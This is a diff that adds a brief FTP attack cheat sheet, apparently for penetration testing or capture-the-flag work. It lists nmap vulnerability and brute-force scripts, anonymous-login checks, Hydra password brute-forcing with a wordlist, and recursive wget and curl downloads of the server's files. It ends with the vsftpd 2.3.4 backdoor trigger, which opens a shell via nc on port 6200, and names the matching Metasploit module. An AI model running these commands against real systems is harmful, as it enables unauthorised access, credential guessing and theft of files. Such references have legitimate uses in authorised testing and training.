@@ -1,0 +1,27 @@
+FTP
+Nmap Scripts
+bashnmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 target
+nmap --script ftp-brute -p 21 target                    # brute force
+nmap --script ftp-anon -p 21 target                     # anon login check
+Tools
+bash# Check anonymous
+ftp target
+# user: anonymous | pass: anything
+
+# Hydra brute
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target
+hydra -L users.txt -P pass.txt ftp://target -t 4
+
+# wget recursive download
+wget -m ftp://anonymous:@target/
+
+# curl
+curl -v ftp://target/ --user anonymous:
+curl ftp://target/file.txt -o file.txt
+
+# vsftpd 2.3.4 backdoor (port 6200 opens)
+telnet target 21
+USER user:)
+PASS pass
+# Then: nc target 6200
+# Or metasploit: use exploit/unix/ftp/vsftpd_234_backdoor
